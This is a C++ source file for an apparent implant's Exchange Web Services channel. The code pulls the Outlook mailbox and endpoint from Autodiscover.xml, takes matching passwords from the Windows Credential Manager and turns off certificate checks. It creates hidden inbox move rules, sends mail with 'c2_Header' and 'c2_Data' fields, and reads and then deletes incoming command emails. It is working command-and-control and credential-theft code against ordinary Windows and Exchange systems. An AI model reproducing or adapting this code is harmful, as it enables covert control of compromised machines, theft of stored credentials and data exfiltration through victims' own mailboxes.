#include "EWS.h"
#include "EWS_Requests.h"
#include "Base64.h"

#include <WinInet.h>
#include <wincred.h>
#include <regex>

#pragma comment(lib, "Wininet.lib")

void replaceInString(std::string& subject, const std::string& search, const std::string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != std::string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
}

void regexEscape(std::string& subject) {
	static std::regex specialChars{ R"([-[\]{}()*+?.,\^$|#\s])" };

	subject = std::regex_replace(subject, specialChars, R"(\$&)");

}
BOOL EWSConnector::Initialize() {

	if (!DiscoverParameters())
		return FALSE;

	printf("[+] EWS Endpoint: %s\n", endpoint.c_str());
	printf("[+] Mailbox: %s\n", mailbox.c_str());

	// TODO: Add a user-agent string
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) FALSE;
	
	INTERNET_PORT port = (INTERNET_PORT)80;
	if (usingSSL) port = (INTERNET_PORT)443;

	hConnection = InternetConnectA(hInternet, server.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnection) return FALSE;

	if (!DiscoverCredentials())
		return FALSE;

	return TRUE;
}

BOOL EWSConnector::DiscoverCredentials() {

	DWORD dwCreds;
	PCREDENTIALA* pCreds = NULL;
	std::string username;
	std::wstring password;

	if (CredEnumerateA(NULL, CRED_ENUMERATE_ALL_CREDENTIALS, &dwCreds, &pCreds))
	{
		for (DWORD i = 0; i < dwCreds; i++)
		{
			if (pCreds[i]->CredentialBlobSize < 4)
				continue;

			username = pCreds[i]->UserName ? pCreds[i]->UserName : "";
			password = std::wstring((LPWSTR)pCreds[i]->CredentialBlob, pCreds[i]->CredentialBlobSize / sizeof(wchar_t));

			if (username.find(mailbox) != std::string::npos) {

				printf("[+] Found vault creds: %s / ", username.c_str());
				wprintf(L"%s...\n", password.substr(0, 4).c_str());

				// TODO: stop mixing string/wstring
				InternetSetOptionA(hConnection, INTERNET_OPTION_USERNAME, (LPVOID)username.c_str(), username.length());
				InternetSetOptionW(hConnection, INTERNET_OPTION_PASSWORD, (LPVOID)password.c_str(), password.length());
			}
		}
		CredFree(pCreds);
	}
	else {
		return FALSE;
	}

	return TRUE;
}


BOOL EWSConnector::DiscoverParameters() {

	WCHAR appdataPath[MAX_PATH];
	CHAR fileBuffer[8192];
	std::wstring fullPath;
	std::string fileData;
	DWORD bytesRead = 0;
	HANDLE hFind, hFile;
	WIN32_FIND_DATA fData;
	size_t start, stop;
	const std::string urlStart = "<EwsUrl>";
	const std::string mailboxStart = "<AutoDiscoverSMTPAddress>";
	const std::string xmlStop = "</";

	if (!ExpandEnvironmentStrings(L"%localappdata%\\Microsoft\\Outlook\\", appdataPath, MAX_PATH))
		return FALSE;

	std::wstring wildcardSearch = std::wstring(appdataPath) + L"*Autodiscover.xml";

	hFind = FindFirstFile(wildcardSearch.c_str(), &fData);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			
			// TODO: Handle multiple files here

			fullPath = std::wstring(appdataPath) + fData.cFileName;
			hFile = CreateFile(fullPath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			if (hFile == (HANDLE)-1)
				continue;

			ReadFile(hFile, fileBuffer, sizeof(fileBuffer), &bytesRead, 0);
			CloseHandle(hFile);
			break;
			
		} while (FindNextFile(hFind, &fData));
		FindClose(hFind);
	}

	if (!bytesRead)
		return FALSE;

	fileData = std::string(fileBuffer, bytesRead);

	if (fileData.find(urlStart) == std::string::npos)
		return FALSE;

	start = fileData.find(urlStart);
	stop = fileData.find(xmlStop, start);
	if (!start || !stop)
		return FALSE;

	endpoint = fileData.substr(start + urlStart.size(), stop - (start + urlStart.size()));

	if (endpoint.find("https") != std::string::npos) {
		usingSSL = TRUE;
		server = endpoint.substr(8);
	}else{
		server = endpoint.substr(7);
	}

	size_t urlPathOffset = server.find("/");
	if (!urlPathOffset)
		return FALSE;

	ewsPath = server.substr(urlPathOffset);
	server = server.substr(0, urlPathOffset);

	start = fileData.find(mailboxStart);
	stop = fileData.find(xmlStop, start);
	if (!start || !stop)
		return FALSE;

	mailbox = fileData.substr(start + mailboxStart.size(), stop - (start + mailboxStart.size()));

	return TRUE;
}

BOOL EWSConnector::MakeRequest(std::string body, std::string &response) {

	DWORD dwBytesAvailable = 0;
	DWORD dwBytesRead = 0;
	HANDLE hRequest;
	BYTE buffer[4096];

	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE;
	if (usingSSL) flags |= INTERNET_FLAG_SECURE;

	hRequest = HttpOpenRequestA(hConnection, "POST", ewsPath.c_str(), NULL, NULL, NULL, flags, 0);
	if (hRequest == NULL) return 0;

	if (usingSSL) {
		DWORD flagsLength = sizeof(flags);
		InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&flags, &flagsLength);
		flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
		InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsLength);
	}

	std::string envelope = "";
	envelope.append(Envelope_Template);
	replaceInString(envelope, insert_Body, body);
	replaceInString(envelope, insert_Version, version);
	replaceInString(envelope, insert_Mailbox, mailbox);

	std::string requestHeaders = "Content-Type: text/xml; charset=utf-8";
	if (!HttpSendRequestA(hRequest, requestHeaders.c_str(), (DWORD)requestHeaders.length(), (PVOID)envelope.c_str(), envelope.length())) {
		int t = GetLastError();
		return FALSE;
	}

	response = "";

	while (InternetQueryDataAvailable(hRequest, &dwBytesAvailable, 0, 0))
	{
		if (!InternetReadFile(hRequest, buffer, sizeof(buffer), &dwBytesRead)) return FALSE;
		if (!dwBytesRead) break;
		response.append((LPSTR)buffer, dwBytesRead);
	}

	if (hRequest) InternetCloseHandle(hRequest);

	return TRUE;
}

BOOL EWSConnector::DoesRuleExist(LPCSTR ruleName) {

	std::string response;
	std::string body = GetRules_Template;

	if (!MakeRequest(body, response))
		return FALSE;

	if (response.find(ruleName) != std::string::npos)
		return TRUE;

	return FALSE;
}

BOOL EWSConnector::CreateMoveRule(LPCSTR ruleName, LPCSTR fromEmail, LPCSTR folderName) {

	std::string response;
	std::string body = CreateMoveRule_Template;

	replaceInString(body, insert_Email, fromEmail);
	replaceInString(body, insert_Name, ruleName);
	replaceInString(body, insert_Folder, folderName);

	if (!MakeRequest(body, response))
		return FALSE;

	return TRUE;
}

BOOL EWSConnector::DeleteRule(LPCSTR ruleName) {
	
	std::string response;
	std::string body = GetRules_Template;

	if (!MakeRequest(body, response))
		return FALSE;

	std::string strRule = std::string(ruleName);
	regexEscape(strRule);

	std::regex rgx("<RuleId>(\\S+)</RuleId><DisplayName>" + strRule + "</DisplayName>");
	std::smatch match;

	if (!std::regex_search(response, match, rgx))
		return FALSE;

	body = DeleteRules_Template;

	replaceInString(body, insert_Id, match[1]);

	if (!MakeRequest(body, response))
		return FALSE;

	return TRUE;
}

BOOL EWSConnector::SendEmailWithHeader(LPCSTR toEmail, LPCSTR c2_Header, LPCSTR c2_Data) {

	std::string response;
	std::string body = SendEmail_Template;

	replaceInString(body, insert_Email, toEmail);
	replaceInString(body, insert_Header, c2_Header);
	replaceInString(body, insert_Data, c2_Data);

	if (!MakeRequest(body, response))
		return FALSE;

	return TRUE;
}

BOOL EWSConnector::SearchEmail(LPCSTR fromEmail, LPCSTR folderName, std::string& mimeContent) {

	mimeContent = std::string();

	std::string response;

	std::string body = FindItemFrom_Template;
	replaceInString(body, insert_Email, fromEmail);
	replaceInString(body, insert_Folder, folderName);

	if (!MakeRequest(body, response))
		return FALSE;

	std::regex rgx("ItemId Id=\"(\\S+)\" ChangeKey=\"(\\S+)\"");
	std::smatch match;

	if (!std::regex_search(response, match, rgx))
		return TRUE; // No items doesn't mean explicit failure

	std::string itemId = match[1];
	std::string changeKey = match[2];

	body = GetItem_Template;
	replaceInString(body, insert_Id, itemId);
	replaceInString(body, insert_Key, changeKey);

	if (!MakeRequest(body, response))
		return FALSE;

	rgx.assign("<t:MimeContent.+?>(\\S+)</t:MimeContent>");

	if (!std::regex_search(response, match, rgx))
		return FALSE;

	if (!Base64Decode(match[1], &mimeContent))
		return FALSE;

	// TODO: Move delete / make it optional

	body = DeleteItem_Template;
	replaceInString(body, insert_Id, itemId);

	if (!MakeRequest(body, response))
		return FALSE;

	return TRUE;
}

BOOL EWSConnector::SearchEmailAndExtractHeader(LPCSTR fromEmail, LPCSTR folderName, LPCSTR headerName, std::string &content) {

	content = std::string();

	std::string mimeContent;
	if (!SearchEmail(fromEmail, folderName, mimeContent))
		return FALSE;

	if (mimeContent.empty())
		return TRUE; // No results

	std::string strHeader = std::string(headerName);
	regexEscape(strHeader);

	std::regex rgx(strHeader + ": (\\S+)");
	std::smatch match;

	if (!std::regex_search(mimeContent, match, rgx))
		return FALSE;

	content = match[1].str();

	return TRUE;
}
